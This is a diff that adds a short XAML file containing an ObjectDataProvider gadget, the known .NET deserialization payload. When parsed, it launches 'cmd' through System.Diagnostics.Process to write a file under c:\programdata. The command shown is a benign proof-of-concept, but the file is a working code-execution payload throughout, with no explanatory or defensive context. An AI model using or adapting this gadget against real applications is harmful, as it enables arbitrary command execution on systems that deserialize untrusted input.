@@ -1,0 +1,10 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+  <ObjectDataProvider.ObjectInstance>
+    <sd:Process>
+      <sd:Process.StartInfo>
+        <sd:ProcessStartInfo Arguments="/c echo 123 &gt; c:\programdata\a.txt" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="cmd" />
+      </sd:Process.StartInfo>
+    </sd:Process>
+  </ObjectDataProvider.ObjectInstance>
+</ObjectDataProvider>
